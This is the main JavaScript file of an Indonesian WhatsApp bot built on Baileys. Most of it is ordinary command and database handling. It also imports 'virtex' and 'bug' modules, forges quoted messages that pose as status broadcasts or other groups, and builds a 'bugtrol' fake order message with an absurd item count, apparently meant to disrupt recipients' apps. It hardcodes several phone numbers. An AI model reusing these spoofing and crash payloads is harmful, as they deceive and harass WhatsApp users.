const {
	WAConnection: _WAConnection,
	MessageType,
	Presence, 
	MessageOptions,
	Mimetype,
	WALocationMessage,
	WA_MESSAGE_STUB_TYPES,
	WA_DEFAULT_EPHEMERAL,
	ReconnectMode,
	ProxyAgent,
	ChatModification,
	GroupSettingChange,
	waChatKey,
    mentionedJid,
    processTime
} = require("@adiwajshing/baileys");
const simple = require("./lib/simple.js");
const WAConnection = simple.WAConnection(_WAConnection);
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const fsx = require("fs-extra")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const tik = require('tiktok-scraper-without-watermark')
const ig = require('insta-fetcher')
const hx = require('hxz-api')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const Fb = require('fb-video-downloader');
const twitterGetUrl = require("twitter-url-direct")
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const crypto = require('crypto')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const util = require('util')
const ph = require('./lib/photooxy.js');
const { hole } = require ("./lib/bughole");
const { help } = require('./media/help');
const { api, beku, korak, petasan, es, mata, black, naga }= require('./lib/hole.js');
const { calender, 
week,
weton, 
jmn, waktoonyabro,
waktoo } = require("./lib/ucapanWaktu");
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close} = require('./lib/functions');   
const _prem = require("./lib/premium");
const atm = require("./lib/atm");
const { virtag } = require('./lib/virtag');
const { ngazap } = require('./lib/ngazap');
const { emoji2 } = require('./lib/emoji2');
const { color, bgcolor, brightcolor } = require('./lib/color');
const { jadibot, stopjadibot, listjadibot } = require('./lib/jadibot');
const { isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { addBalance, kurangBalance, getBalance } = require("./lib/limit");
const { yta, ytv, igdl, upload, formatDate } = require('./lib/ytdl');
const { TiktokDownloader } = require("./lib/gif.js");
const { y2mateA, y2mateV } = require('./lib/y2mate');
const { webp2mp4File} = require('./lib/webp2mp4');
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline');
const { virtex } = require('./lib/virtex');
const { virtex2 } = require('./lib/virtex2');
const { virtex3 } = require('./lib/virtex3');
const { virtex4 } = require('./lib/virtex4');
const { virtex5 } = require('./lib/virtex5');
const { virtex6 } = require('./lib/virtex6');
const { virtex7 } = require('./lib/virtex7');
const { virtex8 } = require('./lib/virtex8');
const { virtex9 } = require('./lib/virtex9');

// Exif & Game ( CHANDRA )
const Exif = require('./lib/exif');
const exif = new Exif(); 

//Entah Lah
var kuis = false
hit_today = []
ky_ttt = []
const setGelud = require('./lib/gameGelud.js');
const game = require("./lib/game");
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]

//Media ( CHANDRA )
let virgam = fs.readFileSync('./media/virgam/virgam.jpeg');
let fakeimage = fs.readFileSync('./media/image/thumb.jpg');
let logoig = fs.readFileSync('./media/image/logoig.jpg');
let logoyt = fs.readFileSync('./media/image/logoyt.jpg');
let potogw = fs.readFileSync('./media/image/fotogw.jpg');
let potofake = fs.readFileSync ('./media/image/fake_1.jpeg');		
let potokeren = fs.readFileSync('./media/image/Chan.jpg');
let setting = JSON.parse(fs.readFileSync('./media/setting/setting.json'));

//Database ( CHANDRA )
const register = JSON.parse(fs.readFileSync('./database/register.json'));
const antilinkyt = JSON.parse(fs.readFileSync('./database/antilinkyt.json'));
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
const antiviewonce = JSON.parse(fs.readFileSync('./database/antiviewonce.json'));
const antilinkwame = JSON.parse(fs.readFileSync('./database/antilinkwame.json'));
const welkom = JSON.parse(fs.readFileSync('./database/welcome.json'));
const scommand = JSON.parse(fs.readFileSync('./database/scommand.json'));
const pendaftar = JSON.parse(fs.readFileSync('./database/user.json'));
const mute = JSON.parse(fs.readFileSync('./database/mute.json'));
const balance = JSON.parse(fs.readFileSync('./database/balance.json'));
const premium = JSON.parse(fs.readFileSync('./database/premium.json'));
const _registered = JSON.parse(fs.readFileSync('./database/registered.json'));
const _level = JSON.parse(fs.readFileSync('./database/level.json'));
const _uang = JSON.parse(fs.readFileSync('./database/uang.json'));
const _update = JSON.parse(fs.readFileSync('./database/update.json'));
const uang = JSON.parse(fs.readFileSync('./database/uang.json'));

const glimit = JSON.parse(fs.readFileSync('./database/glimit.json'));
const bad = JSON.parse(fs.readFileSync('./database/bad.json'));
const afk = JSON.parse(fs.readFileSync('./database/off.json'));
//<------------------------------------------------------------------------------------------------------------------------------------------------------>

//Gak usah lu apa apain!! 

banChats = true // Self and Public
offline = false // Offline and Online 
readG = true // Auto Read Group
readP = true // Autoread Pc
antidel = false // Antidelete
antical = false // Antical
autojoin = false // Auto Join
autorespon = true // Autorespon
multi = setting.multi
nopref = setting.nopref
prefa = setting.perfa
targetpc = setting.targetpc 
owner = setting.owner
ownerName = setting.ownerName
botNumber = setting.botNumber
fakebc = setting.fakebc
fake = setting.fake 
ownerNumber = setting.owner
ownerNumbers = [`${owner}@s.whatsapp.net`,`${botNumber}@s.whatsapp.net`]              
botName = setting.botName
gcount = setting.gcount
dapapi = setting.dapapi
xchillds = setting.xchillds
modelmenu = setting.menu
botver = '3.5.2'
numbernye = '0'
waktu = '-' 
alasan = '-' 
a = '```'

//And json
const getRegisteredRandomId = () => {
	return _registered[Math.floor(Math.random() * _registered.length)].id
}

const addRegisteredUser = (userid, sender, time, serials) => {
	const obj = { id: userid, name: sender, time: time, serial: serials }
	_registered.push(obj)
	fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
}

const createSerial = (size) => {
	return crypto.randomBytes(size).toString('hex').slice(0, size)
}

const checkRegisteredUser = (sender) => {
	let status = false
	Object.keys(_registered).forEach((i) => {
		if (_registered[i].id === sender) {
			status = true
		}
	})
	return status
}
const getLevelingXp = (userId) => {
    let position = false
    Object.keys(_level).forEach((i) => {
        if (_level[i].jid === userId) {
            position = i
        }
    })
    if (position !== false) {
        return _level[position].xp
    }
}
const getLevelingLevel = (userId) => {
    let position = false
    Object.keys(_level).forEach((i) => {
        if (_level[i].jid === userId) {
            position = i
        }
    })
    if (position !== false) {
        return _level[position].level
    }
}
const getLevelingId = (userId) => {
    let position = false
    Object.keys(_level).forEach((i) => {
        if (_level[i].jid === userId) {
            position = i
        }
    })
    if (position !== false) {
        return _level[position].jid
    }
}
const addLevelingXp = (userId, amount) => {
    let position = false
    Object.keys(_level).forEach((i) => {
        if (_level[i].jid === userId) {
            position = i
        }
    })
    if (position !== false) {
        _level[position].xp += amount
        fs.writeFileSync('./database/level.json', JSON.stringify(_level))
    }
}
const addLevelingLevel = (userId, amount) => {
    let position = false
    Object.keys(_level).forEach((i) => {
        if (_level[i].jid === userId) {
            position = i
        }
    })
    if (position !== false) {
        _level[position].level += amount
        fs.writeFileSync('./database/level.json', JSON.stringify(_level))
    }
}
const addLevelingId = (userId) => {
    const obj = {jid: userId, xp: 1, level: 1}
    _level.push(obj)
    fs.writeFileSync('./database/level.json', JSON.stringify(_level))
}
    const xpGain = new Set()
    const isGained = (userId) => {
    return !!xpGain.has(userId)
}
const addCooldown = (userId) => {
    xpGain.add(userId)
    setTimeout(() => {
    return xpGain.delete(userId)
    }, 60000)
}
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
}
const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}
const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}
const checkSCommand = (id) => {
    let status = false
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            status = true
        }
    })
    return status
}                                                                    
module.exports = pemuda = async (pemuda, mek) => {
   try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
        if (!mek.message) return
        if (mek.key && mek.key.remoteJid == 'status@broadcast') return
        if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3) {}
        global.blocked       
        const m = simple.smsg(pemuda, mek);
  
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWib = moment.tz('Asia/Jakarta').format("HH:mm:ss");
		const timeWita = moment().tz('Asia/Makassar').format("HH:mm:ss");
        const timeWit = moment().tz('Asia/Jayapura').format("HH:mm:ss");
        const type = Object.keys(mek.message)[0]        
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
	    if (multi){
		    var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
        } else {
        if (nopref){
            prefix = ''
        } else {
            prefix = prefa
        }
        }
        const body = (type === 'listResponseMessage' && mek.message.listResponseMessage.title) ? mek.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
  
        const boody = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(mek.message[type].fileSha256.toString('base64')) !== null && getCmd(mek.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message[type].fileSha256.toString('base64')) : ""
        const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()	
		const args = body.trim().split(/ +/).slice(1)
		const arg = body.substring(body.indexOf(' ') + 1)
		const isCmd = body.startsWith(prefix)
        const q = args.join(' ')
        const c = args.join(' ')
        const timestamp = speed();
        const latensi = speed() - timestamp
		const run = process.uptime()		
		const botNumber = pemuda.user.jid
		const botNumberss = pemuda.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = isGroup ? mek.participant : mek.key.remoteJid
		const senderNumber = sender.split("@")[0]
        const isOwner = ownerNumbers.includes(sender)
		const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = pemuda.user.phone
		const totalchat = await pemuda.chats.all()
		const totalgroup = await pemuda.chats.array.filter(v => v.jid.endsWith('g.us'))
        const totalkontak = await pemuda.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
        const jumlahUser = pendaftar.length       
        const userLevel = getLevelingLevel(sender)
        const userXp = getLevelingXp(sender)
        const runtimenya = `${kyun(run)}`  
        const readmore = "͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏";      
        hit_today.push(command)   
        isStc = Object.keys(mek.message)[0] == "stickerMessage" ? mek.message.stickerMessage.fileSha256.toString('hex') : ""
	    isStc = `${isStc}`	    
        const isStcQ = isStc !== "" && content.includes("extendedTextMessage") || isStc !== "" && content.includes("conversation")
	    const isStcMedia = isStc !== "" && content.includes("quotedMessage") && !content.includes("extendedTextMessage") || isStc !== "" && content.includes("quotedMessage") && !content.includes("conversation")
	    const isStcVideo = isStcMedia && content.includes("videoMessage")
	    const isStcImage = isStcMedia && content.includes("imageMessage")
	    const isStcSticker = isStcMedia && content.includes("stickerMessage")
        const isStcTeks = isStcMedia && content.includes("quotedMessage")
        const isStcDocs = isStcMedia && content.includes("documentMessage")
        const isStcContact = isStcMedia && content.includes("contactMessage")
        const isStcAudio = isStcMedia && content.includes("audioMessage")
        const isStcLoca = isStcMedia && content.includes("locationMessage")
        const isStcTag = isStcMedia && content.includes("mentionedJid")
        const isStcReply = isStcMedia && content.includes("Message")
        const isStcProd = isStcMedia && content.includes("productMessage")
        const isUser = pendaftar.includes(sender)      
        const totalhit = JSON.parse(fs.readFileSync('./database/totalcmd.json'))[0].totalcmd                                 
		const groupMetadata = isGroup ? await pemuda.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const messagesD = cmd.slice(0).trim().split(/ +/).shift().toLowerCase()
        const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByreply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""								
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByreply) : []								
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
        idttt = []
   	    players1 = []
   	    players2 = []
   	    gilir = []
   	    for (let t of ky_ttt){
   	    idttt.push(t.id)
   	    players1.push(t.player1)
	    players2.push(t.player2)
	    gilir.push(t.gilir)
}
        const isTTT = isGroup ? idttt.includes(from) : false
        isPlayer1 = isGroup ? players1.includes(sender) : false
        isPlayer2 = isGroup ? players2.includes(sender) : false	        
        const isAntiVO = isGroup ? antiviewonce.includes(from) : false
        const isMuted = isGroup ? mute.includes(from) : false  							
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isAntiLinkYt = isGroup ? antilinkyt.includes(from) : false
    	const isAntiLink = isGroup ? antilink.includes(from) : false
		const isWelkom = isGroup ? welkom.includes(from) : false
		const isAntiLinkWa = isGroup ? antilinkwame.includes(from) : false
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
		const isRegister = register.includes(sender)
		const isRegistered = checkRegisteredUser(sender)
        const conts = mek.key.fromMe ? pemuda.user.jid : pemuda.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? pemuda.user.name : conts.notify || conts.vname || conts.name || '-'
        const selectedButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''
        const responseButton = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''         
        
        const isButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedDisplayText : ''
        const isStMsg = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''
        const atibot = m.isBaileys
        const tag1 = "6283803320107@s.whatsapp.net"
        const tag2 = "6285643500930@s.whatsapp.net"
        const tag3 = "6283803320107@s.whatsapp.net"
        const tag4 = "6283856237829@s.whatsapp.net"
        const tag5 = "6285891318105@s.whatsapp.net"
        const tag6 = "6289639600216@s.whatsapp.net"
        const tagwa = "0@s.whatsapp.net"
        const tagme = '6283803320107'	
		try {
		pporang = await pemuda.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
	    } catch {
		pporang = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
		}
		const gambaruser = await getBuffer(pporang)      
	    const katalog = (teks) => { res = pemuda.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 362910378, "message": teks, "footerText": "*_© CHANDRA_*", "thumbnail": fakeimage, "surface": 'CATALOG' }}, {quoted:ftroli})
        pemuda.relayWAMessage(res)} 
        const mess = {
                  "wait": "```[ ! ] Sedang Diproses Kack...```",
                  "success": "```[ ✓ ] Sukses```",
                  "badmin": "```[ ! ] Bot Bukan Admin Kack```",
                  "wrongFormat": "```[ ! ]️ Format is wrong```",
            "error": {
                  "stick": "```[ ! ]️ Sticker Only...```",
                  "lv": "```[ ! ] Yah Error Kack...```",
                  "api": "```[ ! ] Yah Error Kack...```"
               },
            "only": {
                  "uregis": "```[ ! ] Kamu Sudah Melakukan Registrasi_-```",
                  "regis": "```[ ! ] Silahkan Register Terlebih Dahulu, Ketik .register```",
                  "admins": "```[ ! ] Command Ini Khusus Untuk Admin Group...```",
                  "owner": "```[ ! ] Command Ini Khusus Untuk Owner...```",
                  "group": "```[ ! ] Command Ini Khusus Untuk Group...```",
                  "prem": "```[ ! ] Command Ini Khusus Untuk Member Premium...```",
                  "pribadi": "```[ ! ] Command Ini Khusu Untuk Chat Pribadi...```"
               }
         }
        const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
            let po = pemuda.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "LIST MENU","footerText": "Jangan Lupa Donasi☕","listType": "SINGLE_SELECT","sections": list}}, {})
            return pemuda.relayWAMessage(po, {waitForAck: true})
        }                  
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }        
        function randomNomor(angka){
            return Math.floor(Math.random() * angka) + 1
        }
        const reply = (teks) => {
            pemuda.sendMessage(from, teks, text, {quoted:mek})
        }        
        const freply = (teks) => {
            pemuda.sendMessage(from, teks, text, {quoted:mek, sendEphemeral: true, contextInfo:{"externalAdReply":{"title": `@chandrahafi_ User Verify on Intagram`,"body": ``,"previewType": "PHOTO","thumbnail": fakeimage,"sourceUrl": `https://instagram.com/chandrahafi_`}}})
        }        
        const sendMess = (hehe, teks) => {
            pemuda.sendMessage(hehe, teks, text)
        } 
        const sendImage = (teks) => {
   	 	    pemuda.sendMessage(from, teks, image, { quoted: fkontak })
	    }                
        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? pemuda.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : pemuda.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }        
        const mentionsss = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? pemuda.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : pemuda.sendMessage(from, teks.trim(), extendedText, { quoted: fdoc, contextInfo: { "mentionedJid": memberr } })
        }                
        const fakestatus = (teks) => {
            pemuda.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                           "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                           "mimetype": "image/jpeg",
                           "caption": fake,
                           "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                           "fileLength": "28777",
                           "height": 1080,
                           "width": 1079,
                           "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                           "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                           "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                           "mediaKeyTimestamp": "1610993486",
                           "jpegThumbnail": fakeimage,
                           "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }, contextInfo: {"forwardingScore":1,"isForwarded":true},sendEphemeral: true
            })
        }
        const fakethumb = (teks, yes) => {
            pemuda.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./media/image/thumb.jpg'),quoted:mek,caption:yes})
        } 
        const fakegroup = (teks) => {
            pemuda.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                           "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                           "mimetype": "image/jpeg",
                           "caption": fake,
                           "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                           "fileLength": "28777",
                           "height": 1080,
                           "width": 1079,
                           "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                           "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                           "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                           "mediaKeyTimestamp": "1610993486",
                           "jpegThumbnail": fakeimage,
                           "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }, contextInfo: {"forwardingScore":1,"isForwarded":true},sendEphemeral: true
            })
        }        
        const bugtrol = { key: { fromMe: false, 
	        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {})},
                          "message": {
                          "orderMessage": {
                          "orderId": "386756689777647",
						  "itemCount": 1000000000000,
				  		  "status": "INQUIRY",
						  "surface": "CATALOG",
						  "message": "*Hacker By CHANDRA*",
						  "orderTitle": "Chandra",
					  	  "sellerJid": "6285742340891@s.whatsapp.net",
						  "token": "AR4A7ORYqgEUjJ13M6nxZgjl+eVl4r86vY09jyg9/xIiPA=="
}
